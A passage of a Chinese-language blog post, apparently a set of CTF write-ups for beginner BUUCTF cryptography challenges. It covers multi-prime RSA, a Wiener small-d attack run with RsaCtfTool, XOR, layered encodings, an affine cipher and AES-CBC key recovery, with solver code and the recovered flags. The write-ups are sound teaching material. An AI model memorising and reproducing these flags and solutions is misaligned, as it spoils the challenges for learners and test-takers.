data-num=\"32\"></td><td><pre>n8 <span class=\"token operator\">=</span> <span class=\"token number\">2923072267</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>n9 <span class=\"token operator\">=</span> <span class=\"token number\">2970591037</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>n10 <span class=\"token operator\">=</span> <span class=\"token number\">3207148519</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>n11 <span class=\"token operator\">=</span> <span class=\"token number\">3654864131</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>n12 <span class=\"token operator\">=</span> <span class=\"token number\">3831680819</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>n13 <span class=\"token operator\">=</span> <span class=\"token number\">3939901243</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>n14 <span class=\"token operator\">=</span> <span class=\"token number\">4093178561</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>n15 <span class=\"token operator\">=</span> <span class=\"token number\">4278428893</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>n1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n3<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n4<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n5<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n6<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n7<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n8<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n9<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n10<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n11<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n12<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n13<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n14<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n15<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_modulo<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"The inverse of </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> modulo </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>phi<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>inverse<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>m <span class=\"token operator\">=</span> fastExpMod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag 为： <code>flag&#123;us4_s1ge_t0_cal_phI&#125;</code></p>\n<h2 id=\"buuctf-crypto-small-d-task_5\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-small-d-task_5\">#</a> BUUCTF - Crypto small d  task_5</h2>\n<p>原题目如下：</p>\n<p><img data-src=\"image-20230928143400881.png\" alt=\"image-20230928143400881\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></pre></td></tr></table></figure><p>从题目可以看出，其名称为 Small d，并给出了一个人名 **<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvV2llbmVyJTI3c19hdHRhY2s=\">Michael J. Wiener</span>**，该攻击针对 RSA，当 d 很小时，攻击使用连分数法来暴露私钥 d。</p>\n<p>我们直接用 rsactftool 脚本跑</p>\n<pre><code>https://github.com/RsaCtfTool/RsaCtfTool\n</code></pre>\n<pre><code class=\"language-cmd\">python3 RsaCtfTool.py -n 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 -e 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 --uncipher 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 --attack wiener\n</code></pre>\n<p>得出以下内容：</p>\n<p><img data-src=\"image-20230928152305659.png\" alt=\"image-20230928152305659\"></p>\n<p>所以 flag 为： <code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyxor-task_3-简单的异或\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyxor-task_3-简单的异或\">#</a> BUUCTF - Crypto babyxor  task_3 简单的异或</h2>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>f <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></pre></td></tr></table></figure><p>利用在线转换工具将十六进制转换为二进制，得到前 5 个字符的二进制为：</p>\n<pre><code>11101001 11100011 11101110 11101000 11110100\n</code></pre>\n<p>我们可以猜测 前五个字母应该是 flag {，利用 ASCII 转二进制可以知道为：</p>\n<pre><code>01100110 01101100 01100001 01100111 01111011\n</code></pre>\n<p>异或：</p>\n<pre><code>10001111 10001111\n</code></pre>\n<p>可以知道异或密钥为 10001111。然后先利用 16 进制转 2 进制网站，将密文转换为 2 进制；再利用异或在线解密将密文转换为明文；最后用 2 进制转换为 ASCII 码，得到正确答案，flag：  <code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyencoding-task_3txt\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyencoding-task_3txt\">#</a> BUUCTF - Crypto babyencoding task_3.txt</h2>\n<p>题目如下所示：</p>\n<pre><code>part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=\npart 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=\npart 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`\n</code></pre>\n<p>第一行就是 Base64 编码，解码得到：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4\n</code></pre>\n<p>第二行使用 Base64 编码解码得到乱码：</p>\n<pre><code>1?  ?P  ? ?Q1  0?P0?  ??1?? ?R1?? ?\n</code></pre>\n<p>尝试使用 Base32 工具解码得到：</p>\n<pre><code>f0ca08d1e1d0f10c0c7afe422fea7\n</code></pre>\n<p>第三行应该是 UUencode，解码后得到：</p>\n<pre><code>c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>把答案拼起来试试：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>结果正确。</p>\n<h2 id=\"buuctf-crypto-affine-task_2-caesar-with-multiplication\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-affine-task_2-caesar-with-multiplication\">#</a> BUUCTF - Crypto Affine  task_2 Caesar with multiplication</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> key</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>f <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></pre></td></tr></table></figure><p>该题目为  <code>仿射</code> ，提示是  <code>凯撒和乘法</code></p>\n<p>先将密文前五位 16 进制转为 10 进制：</p>\n<pre><code>221 67 136 238 66\n</code></pre>\n<p>根据 modulus 为 256，判断密文应该是对应的 扩展的 ASCII 码。前五位字符原先应该是  <code>flag&#123;</code> ，其所对应的十进制数为：</p>\n<pre><code>102 108 97 103 123\n</code></pre>\n<p>进行暴力破解，我们知道 k0 的逆元 和 k1 的值一定不会大于 256：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">221</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">136</span><span class=\"token punctuation\">,</span><span class=\"token number\">238</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">]</span>   <span class=\"token comment\">#密文</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">103</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">]</span>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> k0 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> k1 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        y_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            y_<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k0<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> y_ <span class=\"token operator\">==</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k0为:'</span><span class=\"token punctuation\">,</span>k0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k1为:'</span><span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'y_为'</span><span class=\"token punctuation\">,</span>y_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>破解结果为：</p>\n<pre><code>k0的逆元 为: 241\nk1为: 23\n</code></pre>\n<p>利用求逆元函数得到，k0 为 17 （没有什么用了）</p>\n<p>根据密文转化为 10 进制数带入上述式子，得到明文 10 进制数为：</p>\n<pre><code>[102, 108, 97, 103, 123, 52, 102, 102, 49, 110, 101, 95, 99, 49, 112, 104, 101, 114, 95, 105, 53, 95, 118, 101, 114, 121, 95, 51, 97, 122, 121, 125]\n</code></pre>\n<p>再将其转化为 ASCII 码得到 flag： <code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyaes-task_1-了解下aes是什么\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyaes-task_1-了解下aes是什么\">#</a> BUUCTF - Crypto babyaes  task_1 了解下 aes 是什么</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> data <span class=\"token operator\">+</span> <span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'\\x00'</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    flag_ <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    iv <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> bytes_to_long<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    enc_flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr></table></figure><p>该题目为 AES 加密，使用了一个密钥 key 和初始化向量 iv，选择的 CBC 模式加密。</p>\n<p>先分析一下题目中的几个关键函数和方法：</p>\n<pre><code>urandom:\n\n语法  os.urandom（size）\n参数：\n\tsize:字符串随机字节的大小\n\t返回值：该方法返回一个字符串，该字符串表示适合加密使用的随机字节。\n例 os.urandom(1)\n输出：b'\\x91'\n二进制：10010001 （8bits）\n</code></pre>\n<pre><code>AES.new(key, mode, *args, **kwargs)\n\nparam key(参数密钥):\n在对称密码中使用的秘密密钥。\n\n它必须为16、24或32个字节长（分别用于AES-128， AES-192或AES-256）。\n\nmode（模式）\n模式（支持的MODE_*常量之一）–用于加密或解密的链接模式。\n学习链接：https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html\n\nKeyword Arguments（关键字参数）：\nIV（字节，字节组，memoryview） - （只适用于MODE_CBC，MODE_CFB，MODE_OFB，和MODE_OPENPGP模式）。\n\n用于加密或解密的初始化向量。\n\n对于MODE_CBC，MODE_CFB和MODE_OFB它必须是16个字节。\n</code></pre>\n<p>解题思路：<br>\n解密 flag 我们需要获取到 key 和 iv 的值，由条件：<br>\nkey=os.urandom(16)*2<br>\niv=os.urandom(16)<br>\n 可知：key 是 32bytes,256bits ；iv 是 16bytes ,128bits</p>\n<p>key^iv ，那么只有 iv 与 key 的低 128 位相异或，所以 key 的高 128 位是固定不变的。所以输出结果的高 128bits, 就是 key 的高 128bits, 进而可以得到 key 的所有值 256bits。之后 key 的低 128bits，与输出结果的低 128bits 相异或，所得结果就是 iv 的值了。key,iv 得到后直接 aes.decrypt () 解密就 ok 了。<br>\n代码如下：</p>\n<figure class=\"highlight 